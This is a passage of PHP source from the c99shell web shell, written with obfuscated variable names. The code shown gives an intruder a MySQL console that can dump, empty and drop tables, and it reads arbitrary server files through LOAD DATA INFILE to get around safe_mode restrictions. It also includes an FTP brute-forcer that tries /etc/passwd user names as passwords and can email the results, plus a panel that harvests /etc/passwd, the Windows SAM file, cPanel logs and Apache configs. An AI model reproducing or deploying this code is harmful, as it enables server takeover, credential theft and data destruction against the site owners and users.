Can\'t write to "' . htmlspecialchars($sp878aa1) . '"!'; } else { fwrite($sp694629, $spe6a02a); fclose($sp694629); echo '<b>Dumped! Dump has been writed to "' . htmlspecialchars(realpath($sp878aa1)) . '" (' . view_size(filesize($sp878aa1)) . ')</b>.'; } } else { echo '<b>Dump: nothing to do!</b>'; } } } if ($sp523568) { if (!empty($spb19fa4)) { if (empty($spfbf420)) { $spfbf420 = 'browse'; } $sp1eb57e = mysql_query('SELECT COUNT(*) FROM `' . $spb19fa4 . '`;'); $spfc9513 = mysql_fetch_array($sp1eb57e); mysql_free_result($sp1eb57e); $sp604bb5 = mysql_query('SHOW FIELDS FROM `' . $spb19fa4 . '`;'); $sp823821 = array(); while ($spa53ce4 = mysql_fetch_assoc($sp604bb5)) { $sp823821[] = $spa53ce4; } if ($spac8150 > $sp0f439c) { $sp0f439c = $spac8150 + $sp52d1bf; } if (empty($sp5d1765)) { $sp5d1765 = 0; } if (empty($sp801697)) { $sp801697 = 0; } if (empty($sp8fa714)) { $sp8fa714 = 30; } $sp52d1bf = $sp8fa714 - $sp801697; if (!is_numeric($sp52d1bf)) { $sp52d1bf = 10; } $spb3a840 = $spfc9513[0] / $sp52d1bf; $sp72c7d5 = explode(' ', $sp855c27); if (count($sp72c7d5) == 2) { if ($sp72c7d5[0] == 'd') { $sp134154 = 'DESC'; } else { $sp134154 = 'ASC'; } $spe2ff4f = 'ORDER BY `' . $sp72c7d5[1] . '` ' . $sp134154 . ' '; } else { $spe2ff4f = ''; } $spd2724c = 'SELECT * FROM `' . $spb19fa4 . '` ' . $spe2ff4f . 'LIMIT ' . $sp801697 . ' , ' . $sp52d1bf . ''; $spea30d5 = mysql_query($spd2724c) or print mysql_smarterror(); echo '<hr size="1" noshade><center><b>Table ' . htmlspecialchars($spb19fa4) . ' (' . mysql_num_fields($spea30d5) . ' cols and ' . $spfc9513[0] . ' rows)</b></center>'; echo '<a href="' . $spdc3312 . 'sql_tbl=' . urlencode($spb19fa4) . '&sql_tbl_act=structure">[&nbsp;<b>Structure</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;'; echo '<a href="' . $spdc3312 . 'sql_tbl=' . urlencode($spb19fa4) . '&sql_tbl_act=browse">[&nbsp;<b>Browse</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;'; echo '<a href="' . $spdc3312 . 'sql_tbl=' . urlencode($spb19fa4) . '&sql_act=tbldump&thistbl=1">[&nbsp;<b>Dump</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;'; echo '<a href="' . $spdc3312 . 'sql_tbl=' . urlencode($spb19fa4) . '&sql_tbl_act=insert">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;'; if ($spfbf420 == 'structure') { echo '<br><br><b>Coming sooon!</b>'; } if ($spfbf420 == 'insert') { if (!is_array($spb624a6)) { $spb624a6 = array(); } if (!empty($sp3becd7)) { } else { echo '<br><br><b>Inserting row into table:</b><br>'; if (!empty($spc414ac)) { $sp6f7371 = 'SELECT * FROM `' . $spb19fa4 . '`'; $sp6f7371 .= ' WHERE' . $spc414ac; $sp6f7371 .= ' LIMIT 1;'; $spea30d5 = mysql_query($sp6f7371, $sp87d39d) or print '<br><br>' . mysql_smarterror(); $spe99d03 = mysql_fetch_assoc($spea30d5); mysql_free_result($spea30d5); } else { $spe99d03 = array(); } echo '<form method="POST"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="1%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>'; foreach ($sp823821 as $spb5262f) { $sp19dd0c = $spb5262f['Field']; if (empty($spc414ac)) { $spe2ff4f = ''; } echo '<tr><td><b>' . htmlspecialchars($sp19dd0c) . '</b></td><td>' . $spb5262f['Type'] . '</td><td><select name="sql_tbl_insert_functs[' . htmlspecialchars($sp19dd0c) . ']"><option value=""></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value="">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type="text" name="sql_tbl_insert[' . htmlspecialchars($sp19dd0c) . ']" value="' . htmlspecialchars($spe99d03[$sp19dd0c]) . '" size=50></td></tr>'; $sp6c3e91++; } echo '</table><br>'; echo '<input type="radio" name="sql_tbl_insert_radio" value="1"'; if (empty($spc414ac)) { echo ' checked'; } echo '><b>Insert as new row</b>'; if (!empty($spc414ac)) { echo ' or <input type="radio" name="sql_tbl_insert_radio" value="2" checked><b>Save</b>'; echo '<input type="hidden" name="sql_tbl_insert_q" value="' . htmlspecialchars($spc414ac) . '">'; } echo '<br><br><input type="submit" value="Confirm"></form>'; } } if ($spfbf420 == 'browse') { $sp801697 = abs($sp801697); $sp8fa714 = abs($sp8fa714); echo '<hr size="1" noshade>'; echo '<img src="' . $sp8c8b96 . 'act=img&img=multipage" height="12" width="10" alt="Pages">&nbsp;'; $sp873f91 = 0; for ($sp6c3e91 = 0; $sp6c3e91 < $spb3a840; $sp6c3e91++) { if ($sp6c3e91 * $sp52d1bf != $sp801697 or $sp6c3e91 * $sp52d1bf + $sp52d1bf != $sp8fa714) { echo '<a href="' . $spdc3312 . 'sql_tbl=' . urlencode($spb19fa4) . '&sql_order=' . htmlspecialchars($sp855c27) . '&sql_tbl_ls=' . $sp6c3e91 * $sp52d1bf . '&sql_tbl_le=' . ($sp6c3e91 * $sp52d1bf + $sp52d1bf) . '"><u>'; } echo $sp6c3e91; if ($sp6c3e91 * $sp52d1bf != $sp801697 or $sp6c3e91 * $sp52d1bf + $sp52d1bf != $sp8fa714) { echo '</u></a>'; } if ($sp6c3e91 / 30 == round($sp6c3e91 / 30) and $sp6c3e91 > 0) { echo '<br>'; } else { echo '&nbsp;'; } } if ($sp6c3e91 == 0) { echo 'empty'; } echo '<form method="GET"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_db" value="' . htmlspecialchars($sp77a7b8) . '"><input type="hidden" name="sql_login" value="' . htmlspecialchars($sp84bb41) . '"><input type="hidden" name="sql_passwd" value="' . htmlspecialchars($spca7496) . '"><input type="hidden" name="sql_server" value="' . htmlspecialchars($sp77adaf) . '"><input type="hidden" name="sql_port" value="' . htmlspecialchars($sp0fd67d) . '"><input type="hidden" name="sql_tbl" value="' . htmlspecialchars($spb19fa4) . '"><input type="hidden" name="sql_order" value="' . htmlspecialchars($sp855c27) . '"><b>From:</b>&nbsp;<input type="text" name="sql_tbl_ls" value="' . $sp801697 . '">&nbsp;<b>To:</b>&nbsp;<input type="text" name="sql_tbl_le" value="' . $sp8fa714 . '">&nbsp;<input type="submit" value="View"></form>'; echo '<br><form method="POST"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="1%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>'; echo '<tr>'; echo '<td><input type="checkbox" name="boxrow_all" value="1"></td>'; for ($sp6c3e91 = 0; $sp6c3e91 < mysql_num_fields($spea30d5); $sp6c3e91++) { $spe2ff4f = mysql_field_name($spea30d5, $sp6c3e91); if ($sp72c7d5[0] == 'a') { $sp676578 = 'd'; $sp838cde = 'asc'; } else { $sp676578 = 'a'; $sp838cde = 'desc'; } echo '<td>'; if (empty($sp72c7d5[0])) { $sp72c7d5[0] = 'a'; } if ($sp72c7d5[1] != $spe2ff4f) { echo '<a href="' . $spdc3312 . 'sql_tbl=' . $spb19fa4 . '&sql_tbl_le=' . $sp8fa714 . '&sql_tbl_ls=' . $sp801697 . '&sql_order=' . $sp72c7d5[0] . '%20' . $spe2ff4f . '"><b>' . $spe2ff4f . '</b></a>'; } else { echo '<b>' . $spe2ff4f . '</b><a href="' . $spdc3312 . 'sql_tbl=' . $spb19fa4 . '&sql_tbl_le=' . $sp8fa714 . '&sql_tbl_ls=' . $sp801697 . '&sql_order=' . $sp676578 . '%20' . $spe2ff4f . '"><img src="' . $sp8c8b96 . 'act=img&img=sort_' . $sp838cde . '" height="9" width="14" alt="' . $sp838cde . '"></a>'; } echo '</td>'; } echo '<td><font color="green"><b>Action</b></font></td>'; echo '</tr>'; while ($spa53ce4 = mysql_fetch_array($spea30d5, MYSQL_ASSOC)) { echo '<tr>'; $sp1cf12d = ''; $sp6c3e91 = 0; foreach ($spa53ce4 as $sp71a197 => $spe2ff4f) { $sp19dd0c = mysql_field_name($spea30d5, $sp6c3e91); $sp1cf12d .= ' `' . $sp19dd0c . '` = \'' . addslashes($spe2ff4f) . '\' AND'; $sp6c3e91++; } if (count($spa53ce4) > 0) { $sp1cf12d = substr($sp1cf12d, 0, strlen($sp1cf12d) - 3); } echo '<td><input type="checkbox" name="boxrow[]" value="' . $sp1cf12d . '"></td>'; $sp6c3e91 = 0; foreach ($spa53ce4 as $sp71a197 => $spe2ff4f) { $spe2ff4f = htmlspecialchars($spe2ff4f); if ($spe2ff4f == '') { $spe2ff4f = '<font color="green">NULL</font>'; } echo '<td>' . $spe2ff4f . '</td>'; $sp6c3e91++; } echo '<td>'; echo '<a href="' . $spdc3312 . 'sql_act=query&sql_tbl=' . urlencode($spb19fa4) . '&sql_tbl_ls=' . $sp801697 . '&sql_tbl_le=' . $sp8fa714 . '&sql_query=' . urlencode('DELETE FROM `' . $spb19fa4 . '` WHERE' . $sp1cf12d . ' LIMIT 1;') . '"><img src="' . $sp8c8b96 . 'act=img&img=sql_button_drop" alt="Delete" height="13" width="11" border="0"></a>&nbsp;'; echo '<a href="' . $spdc3312 . 'sql_tbl_act=insert&sql_tbl=' . urlencode($spb19fa4) . '&sql_tbl_ls=' . $sp801697 . '&sql_tbl_le=' . $sp8fa714 . '&sql_tbl_insert_q=' . urlencode($sp1cf12d) . '"><img src="' . $sp8c8b96 . 'act=img&img=change" alt="Edit" height="14" width="14" border="0"></a>&nbsp;'; echo '</td>'; echo '</tr>'; } mysql_free_result($spea30d5); echo '</table><hr size="1" noshade><p align="left"><img src="' . $sp8c8b96 . 'act=img&img=arrow_ltr" border="0"><select name="sql_act">'; echo '<option value="">With selected:</option>'; echo '<option value="deleterow">Delete</option>'; echo '</select>&nbsp;<input type="submit" value="Confirm"></form></p>'; } } else { $spea30d5 = mysql_query('SHOW TABLE STATUS', $sp87d39d); if (!$spea30d5) { echo mysql_smarterror(); } else { echo '<br><form method="POST"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><input type="checkbox" name="boxtbl_all" value="1"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>'; $sp6c3e91 = 0; $spa6334b = $sp6bf6b1 = 0; while ($spa53ce4 = mysql_fetch_array($spea30d5, MYSQL_ASSOC)) { $spa6334b += $spa53ce4['Data_length']; $sp6bf6b1 += $spa53ce4['Rows']; $sp92ea66 = view_size($spa53ce4['Data_length']); echo '<tr>'; echo '<td><input type="checkbox" name="boxtbl[]" value="' . $spa53ce4['Name'] . '"></td>'; echo '<td>&nbsp;<a href="' . $spdc3312 . 'sql_tbl=' . urlencode($spa53ce4['Name']) . '"><b>' . $spa53ce4['Name'] . '</b></a>&nbsp;</td>'; echo '<td>' . $spa53ce4['Rows'] . '</td>'; echo '<td>' . $spa53ce4['Type'] . '</td>'; echo '<td>' . $spa53ce4['Create_time'] . '</td>'; echo '<td>' . $spa53ce4['Update_time'] . '</td>'; echo '<td>' . $sp92ea66 . '</td>'; echo '<td>&nbsp;<a href="' . $spdc3312 . 'sql_act=query&sql_query=' . urlencode('DELETE FROM `' . $spa53ce4['Name'] . '`') . '"><img src="' . $sp8c8b96 . 'act=img&img=sql_button_empty" alt="Empty" height="13" width="11" border="0"></a>&nbsp;&nbsp;<a href="' . $spdc3312 . 'sql_act=query&sql_query=' . urlencode('DROP TABLE `' . $spa53ce4['Name'] . '`') . '"><img src="' . $sp8c8b96 . 'act=img&img=sql_button_drop" alt="Drop" height="13" width="11" border="0"></a>&nbsp;<a href="' . $spdc3312 . 'sql_tbl_act=insert&sql_tbl=' . $spa53ce4['Name'] . '"><img src="' . $sp8c8b96 . 'act=img&img=sql_button_insert" alt="Insert" height="13" width="11" border="0"></a>&nbsp;</td>'; echo '</tr>'; $sp6c3e91++; } echo '<tr bgcolor="000000">'; echo '<td><center><b>Â»</b></center></td>'; echo '<td><center><b>' . $sp6c3e91 . ' table(s)</b></center></td>'; echo '<td><b>' . $sp6bf6b1 . '</b></td>'; echo '<td>' . $spa53ce4[1] . '</td>'; echo '<td>' . $spa53ce4[10] . '</td>'; echo '<td>' . $spa53ce4[11] . '</td>'; echo '<td><b>' . view_size($spa6334b) . '</b></td>'; echo '<td></td>'; echo '</tr>'; echo '</table><hr size="1" noshade><p align="right"><img src="' . $sp8c8b96 . 'act=img&img=arrow_ltr" border="0"><select name="sql_act">'; echo '<option value="">With selected:</option>'; echo '<option value="tbldrop">Drop</option>'; echo '<option value="tblempty">Empty</option>'; echo '<option value="tbldump">Dump</option>'; echo '<option value="tblcheck">Check table</option>'; echo '<option value="tbloptimize">Optimize table</option>'; echo '<option value="tblrepair">Repair table</option>'; echo '<option value="tblanalyze">Analyze table</option>'; echo '</select>&nbsp;<input type="submit" value="Confirm"></form></p>'; mysql_free_result($spea30d5); } } } } } else { $spbebb5b = array('', 'newdb', 'serverstatus', 'servervars', 'processes', 'getfile'); if (in_array($spe49285, $spbebb5b)) { ?>
<table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new DB:</b><form action="<?php  echo $sp8c8b96; ?>
"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newdb"><input type="hidden" name="sql_login" value="<?php  echo htmlspecialchars($sp84bb41); ?>
"><input type="hidden" name="sql_passwd" value="<?php  echo htmlspecialchars($spca7496); ?>
"><input type="hidden" name="sql_server" value="<?php  echo htmlspecialchars($sp77adaf); ?>
"><input type="hidden" name="sql_port" value="<?php  echo htmlspecialchars($sp0fd67d); ?>
"><input type="text" name="sql_newdb" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>View File:</b><form action="<?php  echo $sp8c8b96; ?>
"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="getfile"><input type="hidden" name="sql_login" value="<?php  echo htmlspecialchars($sp84bb41); ?>
"><input type="hidden" name="sql_passwd" value="<?php  echo htmlspecialchars($spca7496); ?>
"><input type="hidden" name="sql_server" value="<?php  echo htmlspecialchars($sp77adaf); ?>
"><input type="hidden" name="sql_port" value="<?php  echo htmlspecialchars($sp0fd67d); ?>
"><input type="text" name="sql_getfile" size="30" value="<?php  echo htmlspecialchars($sp44301d); ?>
">&nbsp;<input type="submit" value="Get"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php  } if (!empty($spe49285)) { echo '<hr size="1" noshade>'; if ($spe49285 == 'newdb') { echo '<b>'; if (mysql_create_db($sp29db6c) and !empty($sp29db6c)) { echo 'DB "' . htmlspecialchars($sp29db6c) . '" has been created with success!</b><br>'; } else { echo 'Can\'t create DB "' . htmlspecialchars($sp29db6c) . '".<br>Reason:</b> ' . mysql_smarterror(); } } if ($spe49285 == 'serverstatus') { $spea30d5 = mysql_query('SHOW STATUS', $sp87d39d); echo '<center><b>Server-status variables:</b><br><br>'; echo '<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>'; while ($spa53ce4 = mysql_fetch_array($spea30d5, MYSQL_NUM)) { echo '<tr><td>' . $spa53ce4[0] . '</td><td>' . $spa53ce4[1] . '</td></tr>'; } echo '</table></center>'; mysql_free_result($spea30d5); } if ($spe49285 == 'servervars') { $spea30d5 = mysql_query('SHOW VARIABLES', $sp87d39d); echo '<center><b>Server variables:</b><br><br>'; echo '<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>'; while ($spa53ce4 = mysql_fetch_array($spea30d5, MYSQL_NUM)) { echo '<tr><td>' . $spa53ce4[0] . '</td><td>' . $spa53ce4[1] . '</td></tr>'; } echo '</table>'; mysql_free_result($spea30d5); } if ($spe49285 == 'processes') { if (!empty($spd86ff3)) { $spd2724c = 'KILL ' . $spd86ff3 . ';'; $spea30d5 = mysql_query($spd2724c, $sp87d39d); echo '<b>Killing process #' . $spd86ff3 . '... ok. he is dead, amen.</b>'; } $spea30d5 = mysql_query('SHOW PROCESSLIST', $sp87d39d); echo '<center><b>Processes:</b><br><br>'; echo '<TABLE cellSpacing=0 cellPadding=2 bgColor=#333333 borderColorLight=#333333 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>'; while ($spa53ce4 = mysql_fetch_array($spea30d5, MYSQL_NUM)) { echo '<tr><td>' . $spa53ce4[0] . '</td><td>' . $spa53ce4[1] . '</td><td>' . $spa53ce4[2] . '</td><td>' . $spa53ce4[3] . '</td><td>' . $spa53ce4[4] . '</td><td>' . $spa53ce4[5] . '</td><td>' . $spa53ce4[6] . '</td><td>' . $spa53ce4[7] . '</td><td><a href="' . $spdc3312 . 'sql_act=processes&kill=' . $spa53ce4[0] . '"><u>Kill</u></a></td></tr>'; } echo '</table>'; mysql_free_result($spea30d5); } if ($spe49285 == 'getfile') { $spa8cfde = $sp84bb41 . '_tmpdb'; $sp4bd588 = mysql_select_db($spa8cfde); if (!$sp4bd588) { mysql_create_db($spa8cfde); $sp4bd588 = mysql_select_db($spa8cfde); $sp4b3755 = !!$sp4bd588; } if ($sp4bd588) { $sp4b3755 = false; mysql_query('CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );'); mysql_query('LOAD DATA INFILE "' . addslashes($sp44301d) . '" INTO TABLE tmp_file'); $spea30d5 = mysql_query('SELECT * FROM tmp_file;'); if (!$spea30d5) { echo '<b>Error in reading file (permision denied)!</b>'; } else { for ($sp6c3e91 = 0; $sp6c3e91 < mysql_num_fields($spea30d5); $sp6c3e91++) { $sp19dd0c = mysql_field_name($spea30d5, $sp6c3e91); } $sp224638 = ''; while ($spa53ce4 = mysql_fetch_array($spea30d5, MYSQL_ASSOC)) { $sp224638 .= join('
', $spa53ce4); } if (empty($sp224638)) { echo '<b>File "' . $sp44301d . '" does not exists or empty!</b><br>'; } else { echo '<b>File "' . $sp44301d . '":</b><br>' . nl2br(htmlspecialchars($sp224638)) . '<br>'; } mysql_free_result($spea30d5); mysql_query('DROP TABLE tmp_file;'); } } mysql_drop_db($spa8cfde); } } } } echo '</td></tr></table>'; if ($sp87d39d) { $sp9cbf14 = @mysql_affected_rows($sp87d39d); if (!is_numeric($sp9cbf14) or $sp9cbf14 < 0) { $sp9cbf14 = 0; } echo '<tr><td><center><b>Affected rows: ' . $sp9cbf14 . '</center></td></tr>'; } echo '</table>'; } if ($spe3b8cc == 'mkdir') { if ($sp8089e9 != $sp6bf0a4) { if (file_exists($sp8089e9)) { echo '<b>Make Dir "' . htmlspecialchars($sp8089e9) . '"</b>: object alredy exists'; } elseif (!mkdir($sp8089e9)) { echo '<b>Make Dir "' . htmlspecialchars($sp8089e9) . '"</b>: access denied'; } echo '<br><br>'; } $spe3b8cc = $sp68666d = 'ls'; } if ($spe3b8cc == 'ftpquickbrute') { echo '<b>Ftp Quick brute:</b><br>'; if (!win) { echo 'This functions not work in Windows!<br><br>'; } else { function c99ftpbrutecheck($spe8f871, $sp2d79fe, $spb4e1a7, $spea63b2, $sp83677c, $sp068bc7, $speb44d5) { if ($speb44d5) { $sp8ff313 = !in_array($sp068bc7, array('/bin/false', '/sbin/nologin')); } else { $sp8ff313 = true; } if ($sp8ff313) { $spfe78c5 = @ftp_connect($spe8f871, $sp2d79fe, $spb4e1a7); if (@ftp_login($spfe78c5, $spea63b2, $sp83677c)) { echo '<a href="ftp://' . $spea63b2 . ':' . $sp83677c . '@' . $spe8f871 . '" target="_blank"><b>Connected to ' . $spe8f871 . ' with login "' . $spea63b2 . '" and password "' . $sp83677c . '"</b></a>.<br>'; ob_flush(); return true; } } } if (!empty($spff71ed)) { if (!is_numeric($spb021df)) { $spb021df = $spc1c534; } $sp694629 = fopen('/etc/passwd', 'r'); if (!$sp694629) { echo 'Can\'t get /etc/passwd for password-list.'; } else { if ($sp992b30) { if ($sp124e42) { $sp0b0475 = fopen($sp124e42, 'w'); } else { $sp0b0475 = false; } $sp692e0d = 'FTP Quick Brute (called c99shell v. ' . $sp272375 . ') started at ' . date('d.m.Y H:i:s') . '

'; if ($sp124e42) { fwrite($sp0b0475, $sp692e0d, strlen($sp692e0d)); } } ob_flush(); $sp6c3e91 = $sp29c1b6 = 0; $sp47d7e9 = getmicrotime(); while (!feof($sp694629)) { $sp6ff357 = explode(':', fgets($sp694629, 2048)); if (c99ftpbrutecheck('localhost', 21, 1, $sp6ff357[0], $sp6ff357[0], $sp6ff357[6], $speb44d5)) { echo '<b>Connected to ' . getenv('SERVER_NAME') . ' with login "' . $sp6ff357[0] . '" and password "' . $sp6ff357[0] . '"</b><br>'; $sp692e0d .= 'Connected to ' . getenv('SERVER_NAME') . ' with login "' . $sp6ff357[0] . '" and password "' . $sp6ff357[0] . '", at ' . date('d.m.Y H:i:s') . '
'; if ($sp0b0475) { fseek($sp0b0475, 0); fwrite($sp0b0475, $sp692e0d, strlen($sp692e0d)); } $sp29c1b6++; ob_flush(); } if ($sp6c3e91 > $spb021df) { break; } $sp6c3e91++; } if ($sp29c1b6 == 0) { echo 'No success. connections!'; $sp692e0d .= 'No success. connections!
'; } $sp258832 = round(getmicrotime() - $sp47d7e9, 4); echo '<hr size="1" noshade><b>Done!</b><br>Total time (secs.): ' . $sp258832 . '<br>Total connections: ' . $sp6c3e91 . '<br>Success.: <font color=green><b>' . $sp29c1b6 . '</b></font><br>Unsuccess.:' . ($sp6c3e91 - $sp29c1b6) . '</b><br>Connects per second: ' . round($sp6c3e91 / $sp258832, 2) . '<br>'; $sp692e0d .= '
------------------------------------------
Done!
Total time (secs.): ' . $sp258832 . '
Total connections: ' . $sp6c3e91 . '
Success.: ' . $sp29c1b6 . '
Unsuccess.:' . ($sp6c3e91 - $sp29c1b6) . '
Connects per second: ' . round($sp6c3e91 / $sp258832, 2) . '
'; if ($sp0b0475) { fseek($sp0b0475, 0); fwrite($sp0b0475, $sp692e0d, strlen($sp692e0d)); } if ($sp036e27) { @mail($sp036e27, 'c99shell v. ' . $sp272375 . ' report', $sp692e0d); } fclose($sp0b0475); } } else { $spb65360 = $spa74a34 . 'c99sh_ftpquickbrute_' . date('d.m.Y_H_i_s') . '.log'; $spb65360 = str_replace('//', DIRECTORY_SEPARATOR, $spb65360); echo '<form action="' . $sp8c8b96 . '"><input type=hidden name=act value="ftpquickbrute"><br>Read first: <input type=text name="fqb_lenght" value="' . $spc1c534 . '"><br><br>Users only with shell?&nbsp;<input type="checkbox" name="fqb_onlywithsh" value="1"><br><br>Logging?&nbsp;<input type="checkbox" name="fqb_logging" value="1" checked><br>Logging to file?&nbsp;<input type="text" name="fqb_logfile" value="' . $spb65360 . '" size="' . (strlen($spb65360) + 2 * (strlen($spb65360) / 10)) . '"><br>Logging to e-mail?&nbsp;<input type="text" name="fqb_logemail" value="' . $spf16714 . '" size="' . (strlen($sp4fc7ae) + 2 * (strlen($sp4fc7ae) / 10)) . '"><br><br><input type=submit name=submit value="Brute"></form>'; } } } if ($spe3b8cc == 'd') { if (!is_dir($sp6bf0a4)) { echo '<center><b>Permision denied!</b></center>'; } else { echo '<b>Directory information:</b><table border=0 cellspacing=1 cellpadding=2>'; if (!$sp01e9c0) { echo '<tr><td><b>Owner/Group</b></td><td> '; $spc936c1 = posix_getpwuid(fileowner($sp6bf0a4)); $spdd067c = posix_getgrgid(filegroup($sp6bf0a4)); $spa53ce4[] = ($spc936c1['name'] ? $spc936c1['name'] : fileowner($sp6bf0a4)) . '/' . ($spdd067c['name'] ? $spdd067c['name'] : filegroup($sp6bf0a4)); } echo '<tr><td><b>Perms</b></td><td><a href="' . $sp8c8b96 . 'act=chmod&d=' . urlencode($sp6bf0a4) . '"><b>' . view_perms_color($sp6bf0a4) . '</b></a><tr><td><b>Create time</b></td><td> ' . date('d/m/Y H:i:s', filectime($sp6bf0a4)) . '</td></tr><tr><td><b>Access time</b></td><td> ' . date('d/m/Y H:i:s', fileatime($sp6bf0a4)) . '</td></tr><tr><td><b>MODIFY time</b></td><td> ' . date('d/m/Y H:i:s', filemtime($sp6bf0a4)) . '</td></tr></table><br>'; } } if ($spe3b8cc == 'phpinfo') { @ob_clean(); phpinfo(); c99shexit(); } if ($spe3b8cc == 'security') { echo '<center><b>Server security information:</b></center><b>Open base dir: ' . $spce4cbf . '</b><br>'; if (!$sp01e9c0) { if ($sp812e2b) { if ($sp812e2b == 1) { $sp812e2b = 0; } echo '<b>*nix /etc/passwd:</b><br>'; if (!is_numeric($speb9625)) { $speb9625 = 0; } if (!is_numeric($spef027f)) { $spef027f = $spc1c534; } echo '<form action="' . $sp8c8b96 . '"><input type=hidden name=act value="security"><input type=hidden name="nixpasswd" value="1"><b>From:</b>&nbsp;<input type="text=" name="nixpwd_s" value="' . $speb9625 . '">&nbsp;<b>To:</b>&nbsp;<input type="text" name="nixpwd_e" value="' . $spef027f . '">&nbsp;<input type=submit value="View"></form><br>'; $sp6c3e91 = $speb9625; while ($sp6c3e91 < $spef027f) { $spca6b76 = posix_getpwuid($sp6c3e91); if ($spca6b76) { $spca6b76['dir'] = '<a href="' . $sp8c8b96 . 'act=ls&d=' . urlencode($spca6b76['dir']) . '">' . $spca6b76['dir'] . '</a>'; echo join(':', $spca6b76) . '<br>'; } $sp6c3e91++; } } else { echo '<br><a href="' . $sp8c8b96 . 'act=security&nixpasswd=1&d=' . $spb26308 . '"><b><u>Get /etc/passwd</u></b></a><br>'; } } else { $spe2ff4f = $_SERVER['WINDIR'] . 'epair\\sam'; if (file_get_contents($spe2ff4f)) { echo '<b><font color=red>You can\'t crack winnt passwords(' . $spe2ff4f . ') </font></b><br>'; } else { echo '<b><font color=green>You can crack winnt passwords. <a href="' . $sp8c8b96 . 'act=f&f=sam&d=' . $_SERVER['WINDIR'] . '\\repair&ft=download"><u><b>Download</b></u></a>, and use lcp.crack+ Â©.</font></b><br>'; } } if (file_get_contents('/etc/userdomains')) { echo '<b><font color=green><a href="' . $sp8c8b96 . 'act=f&f=userdomains&d=' . urlencode('/etc') . '&ft=txt"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>'; } if (file_get_contents('/var/cpanel/accounting.log')) { echo '<b><font color=green><a href="' . $sp8c8b96 . 'act=f&f=accounting.log&d=' . urlencode('/var/cpanel/') . '"&ft=txt><u><b>View cpanel logs</b></u></a></font></b><br>'; } if (file_get_contents('/usr/local/apache/conf/httpd.conf')) { echo '<b><font color=green><a href="' . $sp8c8b96 . 'act=f&f=httpd.conf&d=' . urlencode('/usr/local/apache/conf') . '&ft=txt"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>'; } if (file_get_contents('/etc/httpd.conf')) { echo '<b><font color=green><a href="' . $sp8c8b96 . 'act=f&f=httpd.conf&d=' . urlencode('/etc') . '&ft=txt"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>'; } if (file_get_contents('/etc/syslog.conf')) { echo '<b><font color=green><a href="' . $sp8c8b96 . 'act=f&f=syslog.conf&d=' . urlencode('/etc') . '&ft=txt"><u><b>Syslog configuration (syslog.conf)</b></u></a></font></b><br>'; } if (file_get_contents('/etc/motd')) { echo '<b><font color=green><a href="' . $sp8c8b96 . 'act=f&f=motd&d=' . urlencode('/etc') . '&ft=txt"><u><b>Message Of The Day</b></u></a></font></b><br>'; } if (file_get_contents('/etc/hosts')) { echo '<b><font color=green><a href="' . $sp8c8b96 . 'act=f&f=hosts&d=' . urlencode('/etc') . '&ft=txt"><u><b>Hosts</b></u></a></font></b><br>'; } function displaysecinfo($sp19dd0c, $spc3da4d) { if (!empty($spc3da4d)) { if (!empty($sp19dd0c)) { $sp19dd0c = '<b>' . $sp19dd0c . ' - </b>'; } echo $sp19dd0c . nl2br($spc3da4d) . '<br>'; } } displaysecinfo('OS Version?', myshellexec('cat /proc/version')); displaysecinfo('Kernel version?', myshellexec('sysctl -a | grep version')); displaysecinfo('Distrib name', myshellexec('cat /etc/issue.net')); displaysecinfo('Distrib name (2)', myshellexec('cat /etc/*-realise')); displaysecinfo('CPU?', myshellexec('cat /proc/cpuinfo')); displaysecinfo('RAM', myshellexec('free -m')); displaysecinfo('HDD space', myshellexec('df -h')); displaysecinfo('List of Attributes', myshellexec('lsattr -a')); displaysecinfo('Mount options ', myshellexec('cat /etc/fstab')); displaysecinfo('Is cURL installed?', myshellexec('which curl')); displaysecinfo('Is lynx installed?', myshellexec('which lynx')); displaysecinfo('Is links installed?', myshellexec('which links')); displaysecinfo('Is fetch installed?', myshellexec('which fetch')); displaysecinfo('Is GET installed?', myshellexec('which GET')); displaysecinfo('Is perl installed?', myshellexec('which perl')); displaysecinfo('Where is apache', 